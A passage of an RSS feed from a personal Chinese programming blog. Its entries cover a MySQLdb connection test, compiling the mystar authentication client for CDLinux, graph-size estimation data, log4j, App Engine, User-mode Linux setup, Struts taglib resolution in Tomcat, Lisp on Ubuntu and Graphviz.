#conn=MySQLdb.connect(host='localhost',user='xiaoneiu',passwd='xiaoneip',db='xiaonei')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #conn=MySQLdb.connect(host='localhost',user='xiaoneiu',passwd='xiaoneip',db='xiaonei',charset='utf8',use_unicode=False)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cursor=conn.cursor()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cursor.execute('select * from user where false')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sys.stdout.write('.')<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sys.stdout.flush()<br>def testset():<br>&nbsp;&nbsp;&nbsp; a=set()<br>&nbsp;&nbsp;&nbsp; fid=282878785<br>&nbsp;&nbsp;&nbsp; for i in range(fid, fid+2000000):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; a.add(str(i))<br><br>testdb()<br><br><br>参考：http://sourceforge.net/tracker/index.php?func=detail&amp;aid=2125250&amp;group_id=22307&amp;atid=374932]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>DataBase</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720105141191894/</guid>
    </item>
    <item>
      <title>
<![CDATA[移植锐捷认证mystar到CDLinux 0.4.9]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008931102920941/</link>
      <description>
<![CDATA[1. 启动Slackware 8.1虚拟机<br>2. 下载源代码包：libnet-1.1.2.tar.gz libpcap-0.8.1.tar.gz mystar.tar.gz<br>3. 解压缩并编译libnet和libpcap<br>gunzip libnet-1.1.2.tar.gz<br>tar xf libnet-1.1.2.tar<br>cd libnet-1.1.2<br>./configure<br>make<br>make install<br>cd ..<br>gunzip libpcap-0.8.1.tar.gz<br>  tar xf libpcap-0.8.1.tar<br>  cd libpcap-0.8.1<br>  ./configure<br>  make<br>  make install<br>cd ..<br>4. 编译mystar<br>gunzip mystar.tar.gz<br>tar xf mystar.tar<br>cd mystar<br>#因为mystar默认使用动态库，而我们这里用的是静态库，所以这里需要修改Makefile<br>sed "s/-lnet/\/usr\/lib\/libnet.a/g" Makefile&gt;Makefile.tmp<br>sed "s/-lpcap/\/usr\/local\/lib\/libpcap.a/g" Makefile.tmp &gt; Makefile<br>make<br>5. 打包成CDLinux的TGZ格式<br>mkdir -p tgz/{bin,etc}<br>chmod 755 mystar<br>cp mystar tgz/bin<br>cp mystar.conf tgz/etc<br>cd tgz<br>tar zcvf mystar-1.0-cdl.tgz *<br>最终的mystar-1.0-cdl.tgz可以从<a target="_blank" rel="nofollow" href="http://cbib.cnkk.org/wiki/attach/Cdlinux_add/mystar-1.0-cdl.tgz"  >这里下载</a>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008931102920941/</guid>
    </item>
    <item>
      <title>
<![CDATA[根据深度搜索的中间过程预测图的节点数]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720105287526487/</link>
      <description>
<![CDATA[有一个程序，记录着一个无向图，每输入一个节点号，这个程序就会输出所有与这个节点连通的节点，刚开始只知道一个节点，但是随着输入次数的增加，知道的节点起来越多。<br>例如<br>第1次输入1，输出2 3 4 5 6 7，知道了7个节点(1,2,3,4,5,6,7)，输入次数:知道的节点数= 1:7<br>第2次输入2，输入1 4 6 8 9 10 知道了10个节点(1,2,3,4,5,6,7,8,9,10) 输入次数:知道的节点数= 2:10<br>...<br>第n次输入x,&nbsp; 输出 a b c d e f 知道了n个节点 输入次数:知道的节点数=n:n<br><br>随着输入次数的增加，知道的节点数起来越多，但是输入次数与知道的节点数的比例越来越大，最终变为1<br>现在知道一系列的输入次数与知道的节点数的比例关系，是否可以推测出n的大小<br>下图的曲线模轴为输入次数，纵轴为知道的节点数，直线表示y=x<br><div><img title="根据深度搜索的中间过程预测图的节点数 - hankjin - 云水居" alt="根据深度搜索的中间过程预测图的节点数 - hankjin - 云水居" style="margin: 0pt 10px 0pt 0pt;" src="http://img.ph.126.net/6iUgZe4O9Uc3X6Pv_zhg0g==/3718284442347773250.jpg"></div>&nbsp; <br><br>输入次数 &nbsp;&nbsp;&nbsp; 知道的节点数<br>10000&nbsp;&nbsp; &nbsp;1699216<br>20000&nbsp;&nbsp; &nbsp;2962390<br>30000&nbsp;&nbsp; &nbsp;3897972<br>40000&nbsp;&nbsp; &nbsp;4770376<br>50000&nbsp;&nbsp; &nbsp;5545878<br>60000&nbsp;&nbsp; &nbsp;6275092<br>70000&nbsp;&nbsp; &nbsp;6959062<br>80000&nbsp;&nbsp; &nbsp;7538658<br>90000&nbsp;&nbsp; &nbsp;8093959<br>100000&nbsp;&nbsp; &nbsp;8672215<br>110000&nbsp;&nbsp; &nbsp;9194561<br>120000&nbsp;&nbsp; &nbsp;9684363<br>130000&nbsp;&nbsp; &nbsp;10189078<br>140000&nbsp;&nbsp; &nbsp;10725408<br>150000&nbsp;&nbsp; &nbsp;11152735<br>160000&nbsp;&nbsp; &nbsp;11541985<br>170000&nbsp;&nbsp; &nbsp;11948633<br>180000&nbsp;&nbsp; &nbsp;12331495<br>190000&nbsp;&nbsp; &nbsp;12725078<br>200000&nbsp;&nbsp; &nbsp;13080215<br>210000&nbsp;&nbsp; &nbsp;13435600<br>220000&nbsp;&nbsp; &nbsp;13751027<br>230000&nbsp;&nbsp; &nbsp;13997905<br>240000&nbsp;&nbsp; &nbsp;14313743<br>250000&nbsp;&nbsp; &nbsp;14614580<br>260000&nbsp;&nbsp; &nbsp;14914939<br>270000&nbsp;&nbsp; &nbsp;15206858<br>280000&nbsp;&nbsp; &nbsp;15447845<br>290000&nbsp;&nbsp; &nbsp;15689313<br>300000&nbsp;&nbsp; &nbsp;15915235<br>310000&nbsp;&nbsp; &nbsp;16125883<br>320000&nbsp;&nbsp; &nbsp;16317490<br>330000&nbsp;&nbsp; &nbsp;16527899<br>340000&nbsp;&nbsp; &nbsp;16721145<br>350000&nbsp;&nbsp; &nbsp;16913281<br>360000&nbsp;&nbsp; &nbsp;17082350<br>370000&nbsp;&nbsp; &nbsp;17349543<br>380000&nbsp;&nbsp; &nbsp;17661527<br>390000&nbsp;&nbsp; &nbsp;17903293<br>400000&nbsp;&nbsp; &nbsp;18103685<br>410000&nbsp;&nbsp; &nbsp;18272711<br>420000&nbsp;&nbsp; &nbsp;18467121<br>430000&nbsp;&nbsp; &nbsp;18624771<br>440000&nbsp;&nbsp; &nbsp;18779714<br>450000&nbsp;&nbsp; &nbsp;18929997<br>460000&nbsp;&nbsp; &nbsp;19084879<br>470000&nbsp;&nbsp; &nbsp;19240518<br>480000&nbsp;&nbsp; &nbsp;19373448<br>490000&nbsp;&nbsp; &nbsp;19499829<br>500000&nbsp;&nbsp; &nbsp;19646659<br>510000&nbsp;&nbsp; &nbsp;19774816<br>520000&nbsp;&nbsp; &nbsp;19904372<br>530000&nbsp;&nbsp; &nbsp;20045616<br>540000&nbsp;&nbsp; &nbsp;20174643<br>550000&nbsp;&nbsp; &nbsp;20305790<br>560000&nbsp;&nbsp; &nbsp;20417679<br>570000&nbsp;&nbsp; &nbsp;20541822<br>580000&nbsp;&nbsp; &nbsp;20652637<br>590000&nbsp;&nbsp; &nbsp;20765221<br>600000&nbsp;&nbsp; &nbsp;20878689<br>610000&nbsp;&nbsp; &nbsp;20989092<br>620000&nbsp;&nbsp; &nbsp;21089382<br>630000&nbsp;&nbsp; &nbsp;21198877<br>640000&nbsp;&nbsp; &nbsp;21302923<br>650000&nbsp;&nbsp; &nbsp;21420129<br>660000&nbsp;&nbsp; &nbsp;21527099<br>670000&nbsp;&nbsp; &nbsp;21621196<br>680000&nbsp;&nbsp; &nbsp;21717288<br>690000&nbsp;&nbsp; &nbsp;21808013<br>700000&nbsp;&nbsp; &nbsp;21909724<br>710000&nbsp;&nbsp; &nbsp;22002224<br>720000&nbsp;&nbsp; &nbsp;22090669<br>730000&nbsp;&nbsp; &nbsp;22181707<br>740000&nbsp;&nbsp; &nbsp;22271555<br>750000&nbsp;&nbsp; &nbsp;22364448<br>760000&nbsp;&nbsp; &nbsp;22455908<br>770000&nbsp;&nbsp; &nbsp;22544184<br>780000&nbsp;&nbsp; &nbsp;22631763<br>790000&nbsp;&nbsp; &nbsp;22715099<br>800000&nbsp;&nbsp; &nbsp;22801184<br>810000&nbsp;&nbsp; &nbsp;22883040<br>820000&nbsp;&nbsp; &nbsp;22968808<br>830000&nbsp;&nbsp; &nbsp;23050164<br>840000&nbsp;&nbsp; &nbsp;23124633<br>850000&nbsp;&nbsp; &nbsp;23198760<br>860000&nbsp;&nbsp; &nbsp;23272222<br>870000&nbsp;&nbsp; &nbsp;23346335<br>880000&nbsp;&nbsp; &nbsp;23425089<br>890000&nbsp;&nbsp; &nbsp;23505014<br>900000&nbsp;&nbsp; &nbsp;23577225<br>910000&nbsp;&nbsp; &nbsp;23655173<br>920000&nbsp;&nbsp; &nbsp;23721491<br>930000&nbsp;&nbsp; &nbsp;23787759<br>940000&nbsp;&nbsp; &nbsp;23851439<br>950000&nbsp;&nbsp; &nbsp;23916890<br>960000&nbsp;&nbsp; &nbsp;23980334<br>970000&nbsp;&nbsp; &nbsp;24044567<br>980000&nbsp;&nbsp; &nbsp;24108105<br>990000&nbsp;&nbsp; &nbsp;24171600<br>1000000&nbsp;&nbsp; &nbsp;24236781<br>1010000&nbsp;&nbsp; &nbsp;24298590<br>1020000&nbsp;&nbsp; &nbsp;24356903<br>1030000&nbsp;&nbsp; &nbsp;24415758<br>1040000&nbsp;&nbsp; &nbsp;24477977<br>1050000&nbsp;&nbsp; &nbsp;24534492<br>1060000&nbsp;&nbsp; &nbsp;24589498<br>1070000&nbsp;&nbsp; &nbsp;24646508<br>1080000&nbsp;&nbsp; &nbsp;24701966<br>1090000&nbsp;&nbsp; &nbsp;24755788<br>1100000&nbsp;&nbsp; &nbsp;24812361<br>1110000&nbsp;&nbsp; &nbsp;24866281<br>1120000&nbsp;&nbsp; &nbsp;24917855<br>1130000&nbsp;&nbsp; &nbsp;24971683<br>1140000&nbsp;&nbsp; &nbsp;25026061<br>1150000&nbsp;&nbsp; &nbsp;25077952<br>1160000&nbsp;&nbsp; &nbsp;25130417<br>1170000&nbsp;&nbsp; &nbsp;25186352<br>1180000&nbsp;&nbsp; &nbsp;25239608<br>1190000&nbsp;&nbsp; &nbsp;25291972<br>1200000&nbsp;&nbsp; &nbsp;25345098<br>1210000&nbsp;&nbsp; &nbsp;25393869<br>1220000&nbsp;&nbsp; &nbsp;25535051<br>1230000&nbsp;&nbsp; &nbsp;25599199<br>1240000&nbsp;&nbsp; &nbsp;25652172<br>1250000&nbsp;&nbsp; &nbsp;25705685<br>1260000&nbsp;&nbsp; &nbsp;25756559<br>1270000&nbsp;&nbsp; &nbsp;25806157<br>1280000&nbsp;&nbsp; &nbsp;25854483<br>1290000&nbsp;&nbsp; &nbsp;25902778<br>1300000&nbsp;&nbsp; &nbsp;25948797<br>1310000&nbsp;&nbsp; &nbsp;25996913<br>1320000&nbsp;&nbsp; &nbsp;26044479<br>1330000&nbsp;&nbsp; &nbsp;26092647<br>1340000&nbsp;&nbsp; &nbsp;26138582<br>1350000&nbsp;&nbsp; &nbsp;26185540<br>1360000&nbsp;&nbsp; &nbsp;26232302<br>1370000&nbsp;&nbsp; &nbsp;26277404<br>1380000&nbsp;&nbsp; &nbsp;26322891<br>1390000&nbsp;&nbsp; &nbsp;26367531<br>1400000&nbsp;&nbsp; &nbsp;26410418<br>1410000&nbsp;&nbsp; &nbsp;26453855<br>1420000&nbsp;&nbsp; &nbsp;26495559<br>1430000&nbsp;&nbsp; &nbsp;26537294<br>1440000&nbsp;&nbsp; &nbsp;26578682<br>1450000&nbsp;&nbsp; &nbsp;26619732<br>1460000&nbsp;&nbsp; &nbsp;26662240<br>1470000&nbsp;&nbsp; &nbsp;26705180<br>1480000&nbsp;&nbsp; &nbsp;26747188<br>1490000&nbsp;&nbsp; &nbsp;26790836<br>1500000&nbsp;&nbsp; &nbsp;26831043<br>1510000&nbsp;&nbsp; &nbsp;26876697<br>1520000&nbsp;&nbsp; &nbsp;26917434<br>1530000&nbsp;&nbsp; &nbsp;26959825<br>1540000&nbsp;&nbsp; &nbsp;26998456<br>1550000&nbsp;&nbsp; &nbsp;27037705<br>1560000&nbsp;&nbsp; &nbsp;27074627<br>1570000&nbsp;&nbsp; &nbsp;27112620<br>1580000&nbsp;&nbsp; &nbsp;27152520<br>1590000&nbsp;&nbsp; &nbsp;27189955<br>1600000&nbsp;&nbsp; &nbsp;27227243<br>1610000&nbsp;&nbsp; &nbsp;27263933<br>1620000&nbsp;&nbsp; &nbsp;27300315<br>1630000&nbsp;&nbsp; &nbsp;27337582<br>1640000&nbsp;&nbsp; &nbsp;27373308<br>1650000&nbsp;&nbsp; &nbsp;27410722<br>1660000&nbsp;&nbsp; &nbsp;27444685<br>1670000&nbsp;&nbsp; &nbsp;27479690<br>1680000&nbsp;&nbsp; &nbsp;27515725<br>1690000&nbsp;&nbsp; &nbsp;27551192<br>1700000&nbsp;&nbsp; &nbsp;27586900<br>1710000&nbsp;&nbsp; &nbsp;27621643<br>1720000&nbsp;&nbsp; &nbsp;27656417<br>1730000&nbsp;&nbsp; &nbsp;27691768<br>1740000&nbsp;&nbsp; &nbsp;27727548<br>1750000&nbsp;&nbsp; &nbsp;27762066<br>1760000&nbsp;&nbsp; &nbsp;27796821<br>1770000&nbsp;&nbsp; &nbsp;27832003<br>1780000&nbsp;&nbsp; &nbsp;27866019<br>1790000&nbsp;&nbsp; &nbsp;27899362<br>1800000&nbsp;&nbsp; &nbsp;27932142<br>1810000&nbsp;&nbsp; &nbsp;27965965<br>1820000&nbsp;&nbsp; &nbsp;27999952<br>1830000&nbsp;&nbsp; &nbsp;28032136<br>1840000&nbsp;&nbsp; &nbsp;28064020<br>1850000&nbsp;&nbsp; &nbsp;28097249<br>1860000&nbsp;&nbsp; &nbsp;28130468<br>1870000&nbsp;&nbsp; &nbsp;28162309<br>1880000&nbsp;&nbsp; &nbsp;28194453<br>1890000&nbsp;&nbsp; &nbsp;28225597<br>1900000&nbsp;&nbsp; &nbsp;28257268<br>1910000&nbsp;&nbsp; &nbsp;28291096<br>1920000&nbsp;&nbsp; &nbsp;28320356<br>1930000&nbsp;&nbsp; &nbsp;28354560<br>1940000&nbsp;&nbsp; &nbsp;28384419<br>1950000&nbsp;&nbsp; &nbsp;28415724<br>1960000&nbsp;&nbsp; &nbsp;28447349<br>1970000&nbsp;&nbsp; &nbsp;28478313<br>1980000&nbsp;&nbsp; &nbsp;28507746<br>1990000&nbsp;&nbsp; &nbsp;28537675<br>2000000&nbsp;&nbsp; &nbsp;28566207<br>2010000&nbsp;&nbsp; &nbsp;28597687<br>2020000&nbsp;&nbsp; &nbsp;28627772<br>2030000&nbsp;&nbsp; &nbsp;28657046]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720105287526487/</guid>
    </item>
    <item>
      <title>
<![CDATA[log4j配置文件示例]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078710140972/</link>
      <description>
<![CDATA[<DIV><FONT face=Verdana><FONT size=2>项目中用到log4j时，经常会出现</FONT></FONT></DIV>
<DIV><FONT face=Verdana><FONT size=2>log4j:WARN No appenders could be found for logger (org.apache.axiom.om.impl.builder.StAXOMBuilder).<BR>log4j:WARN Please initialize the log4j system properly.</FONT></FONT></DIV>
<DIV><FONT face=Verdana size=2>的红色警告，只要在原文件根目录下加入log4j.properties文件，内容如下：则问题解决</FONT></DIV>
<DIV><FONT face=Verdana size=2></FONT>&nbsp;</DIV>
<DIV><FONT face=Verdana><FONT size=2>log4j.appender.stdout=org.apache.log4j.ConsoleAppender<BR>log4j.appender.stdout.layout=org.apache.log4j.PatternLayout<BR>log4j.appender.stdout.layout.ConversionPattern=[%5p] %d{HH:mm:ss} %c{1} - %m%n</FONT></FONT></DIV>
<DIV><FONT face=Verdana><FONT size=2>log4j.rootLogger=WARN, stdout</FONT></FONT></DIV>
<DIV><FONT face=Verdana><FONT size=2>log4j.category.com.springinaction=DEBUG<BR>log4j.category.org.springframework=WARN<BR></FONT></FONT></DIV>
<DIV><FONT color=#c0c0c0><FONT size=2></FONT></FONT>&nbsp;</DIV></FONT>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078710140972/</guid>
    </item>
    <item>
      <title>
<![CDATA[杭州行]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372011812025910/</link>
      <description>
<![CDATA[<embed height="560px" pluginspage="http://www.adobe.com/go/getflashplayer" flashvars="mode=3&amp;pid=531210" allowfullscreen="true" allowScriptAccess="always" width="98%" invokeurls="false" src="http://st1.yxp.126.net/flash2/bookview.swf?8989544235" type="application/x-shockwave-flash" wmode="transparent"  > <br>读研两年半，除了武汉，就是09年十一的杭州行了]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>默认分类</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372011812025910/</guid>
    </item>
    <item>
      <title>
<![CDATA[Google Appengine 支持Java环境并提供Eclipse插件]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009310105231/</link>
      <description>
<![CDATA[1. 安装Eclipse3.4的插件:http://dl.google.com/eclipse/plugin/3.4<br>2. 新建-&gt;Web Application Project<br>3. Run As-&gt;Web Application<br>4. 编辑war/WEB-INF/appengine-web.xml&nbsp; <span style="font-family: monospace;">&lt;application&gt;dqzhye&lt;/application&gt;<br>5. Google-&gt;Deploy<br>http://dqzhye.appspot.com/<br><br>todo: google appengine的框架结构, 数据存储方式<br></span>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009310105231/</guid>
    </item>
    <item>
      <title>
<![CDATA[UML under ubuntu]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720100593741700/</link>
      <description>
<![CDATA[<pre># Create an empty file to contain the root filesystem<br>dd if=/dev/zero of=uml-root-hardy bs=4096 seek=1M count=1<br><br># Create the filesystem on the file<br>mkfs.xfs uml-root-hardy<br><br># Mount the filesystem<br>sudo mount -o loop uml-root-hardy /mnt<br><br># Switch to root account for the rest<br>sudo -i<br><br># Install a base system on the mounted partition. Use i386 or amd64 for the --arch option<br>debootstrap --arch amd64 hardy /mnt http://us.archive.ubuntu.com/ubuntu<br><br># Create an fstab file<br>echo "/dev/ubd0  /       xfs     defaults     0 1" &gt; /mnt/etc/fstab<br>echo "proc       /proc   proc    defaults     0 0" &gt;&gt; /mnt/etc/fstab<br><br># Create the device file for the root file system and configure permissions<br>mknod --mode=660 /mnt/dev/ubd0 b 98 0<br>chown root:disk /mnt/dev/ubd0<br><br># Create a hosts file<br>echo "127.0.0.1 localhost" &gt; /mnt/etc/hosts<br><br># Configure network interfaces: eth0 using dhcp<br>echo "auto lo" &gt; /mnt/etc/network/interfaces<br>echo "iface lo inet loopback" &gt;&gt; /mnt/etc/network/interfaces<br>echo "auto eth0" &gt;&gt; /mnt/etc/network/interfaces<br>echo "iface eth0 inet dhcp" &gt;&gt; /mnt/etc/network/interfaces <br><br># Add first terminal and serial terminal to secure list<br>echo "tty0" &gt;&gt; /mnt/etc/securetty<br>echo "ttys/0" &gt;&gt; /mnt/etc/securetty<br><br># Remove the other terminal events<br>rm /mnt/etc/event.d/tty2<br>rm /mnt/etc/event.d/tty3<br>rm /mnt/etc/event.d/tty4<br>rm /mnt/etc/event.d/tty5<br>rm /mnt/etc/event.d/tty6<br>rm /mnt/etc/udev/rules.d/75-persistent-net-generator.rules<br><br># Return to normal account<br>exit</pre>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720100593741700/</guid>
    </item>
    <item>
      <title>
<![CDATA[taglib之struts神奇的uri=&quot;http://struts.apache.org/tags-bean&quot;]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010043263731/</link>
      <description>
<![CDATA[在旧一些的struts版本中，taglib的用法如下：<br>&lt;%@ taglib uri="<span style="font-weight: bold;">/WEB-INF/struts-bean.tld</span>" prefix="bean" %&gt;<br>这个很容易理解，在WEB-INF文件夹下可以找到struts-bean.tld文件<br>然而在比较新的struts版本如1.3.8中，taglib写法如下:<br>&lt;%@ taglib uri="<span style="font-weight: bold;">http://struts.apache.org/tags-bean</span>" prefix="bean" %&gt;<br>这个是怎么回事呢？<br>请出百度，百度说新的struts将tld文件放在struts-taglib.jar文件中了<br>再请出谷歌，谷歌说tomcat等容器启动的时候会自动加载jar文件中的META-INF中的tld文件<br>最后翻开Tomcat的源代码就明白了：<br><br>tomcat5.5.28源代码 <br>apache-tomcat-5.5.28-src\jasper\src\share\org\apache\jasper\compiler\TldLocationsCache.java的246行<br>&nbsp;&nbsp;&nbsp; private void init() throws JasperException {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (initialized) return;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<br><span style="font-weight: bold;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; processWebDotXml();</span><br style="font-weight: bold;"><span style="font-weight: bold;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; scanJars();</span><br style="font-weight: bold;"><span style="font-weight: bold;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; processTldsInFileSystem("/WEB-INF/");</span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; initialized = true;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (Exception ex) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new JasperException(Localizer.getMessage(<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "jsp.error.internal.tldinit", ex.getMessage()));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>首先读取web.xml文件中的配置，<br>然后扫描Jar文件中的tld，<br>最后扫描WEB-INF目录中的jar文件，<br>BINGO，因为struts-taglib.jar放在WEB-INF/lib目录下，所以它的META-INF目录下的tld文件会被Tomcat找到<br><br>然后看神奇的http://struts.apache.org/tags-bean<br>还是这个源文件的373行<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String uri = getUriFromTld(resourcePath, stream);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Add implicit map entry on<wbr>ly if its uri is not already<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // present in the map<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (uri != null &amp;&amp; mappings.get(uri) == null) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span style="font-weight: bold;">mappings.put(uri, new String[]{ resourcePath, name });</span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>和466行<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TreeNode tld = new ParserUtils().parseXMLDocument(resourcePath, in);<br><span style="font-weight: bold;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TreeNode uri = tld.findChild("uri");</span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (uri != null) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String body = uri.getBody();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (body != null)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return body;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>THAT'S ALL.<br>附Tomcat5.5.28源代码下载地址：<br>http://labs.xiaonei.com/apache-mirror/tomcat/tomcat-5/v5.5.28/src/apache-tomcat-5.5.28-src.zip<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return null;<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010043263731/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下的lisp环境]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009612105911758/</link>
      <description>
<![CDATA[首先查找Ubuntu的lisp软件包并安装<br>apt-cache search scheme | grep lisp<br>sudo apt-get install librep9 librep-doc<br>查看使用说明<br>info librep<br><br>进入与退出lisp环境<br>rep命令进入lisp交互环境，Ctrl-D退出<br><br>rep不支持else函数，解决方案：<br>vi ~/.reprc<br>(define else (= 1 1))<br><br>加载lisp文件的方法：<br>在当前目录下创建hank.jl，然后进入rep交互式环境<br>(load "hank")<br>即可自动执行hank.jl中的脚本<br><br>直接运行lisp文件的方法<br>在lisp脚本的开头加入两行，如下test.jl所示<br>#!/usr/bin/rep<br>!#<br>(print 9)<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009612105911758/</guid>
    </item>
    <item>
      <title>
<![CDATA[Graphviz画图:流程图，内存分布图，数据结构图]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201081284736746/</link>
      <description>
<![CDATA[&nbsp;Graphviz是一个画图工具，可以使用文本生成常用流程图，数据结构图等各种计算机科学常用图片：<br>Ubuntu自带graphviz, sudo apt-get install graphviz 即可<br>Windows安装文件可以在官方站点下载，http://www.graphviz.org/Download..php<br><b>g1.dot</b><br><div><img title="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" alt="Graphviz画图:流程图，内存分布图，数据结构图 - hankjin - 云水居" style="margin: 10px 10px 10px 0pt; float: left;" src="http://img616.ph.126.net/uq49f7bMWo6Cvnyo7eJfsA==/1704893933938048309.jpg" height="301" width="369"></div>&nbsp;<div>digraph G{<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; parse -&gt; execute;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; init;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; cleanup;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execute -&gt; make_string;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execute -&gt; printf<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; init -&gt; make_string;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; main -&gt; printf;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execute -&gt; compare;<br>
}<br>
